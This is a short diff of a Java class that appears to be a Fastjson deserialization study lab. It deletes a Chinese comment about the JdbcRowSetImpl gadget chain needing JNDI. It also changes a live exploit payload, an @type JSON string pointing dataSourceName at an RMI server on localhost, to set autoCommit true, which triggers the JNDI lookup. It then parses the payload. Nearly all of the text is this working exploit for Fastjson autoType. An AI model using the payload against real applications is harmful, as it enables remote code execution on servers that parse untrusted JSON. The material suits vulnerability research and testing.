@@ -119,13 +119,12 @@ public class Fastjson {
 
         /*
         JdbcRowSetImpl链子
-        这个是必须JNDI，所以只有RMI是不行的
          */
 
 //        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"rmi://localhost:1023/RMIObj\",\"autoCommit\": false}";
 //        JSON.parse(payload,Feature.SupportNonPublicField);
 
-        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1023/RMIObj\", \"autoCommit\":false}";
+        String payload2 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1023/RMIObj\",\"autoCommit\": true}";
         JSON.parse(payload2);
     }
 }
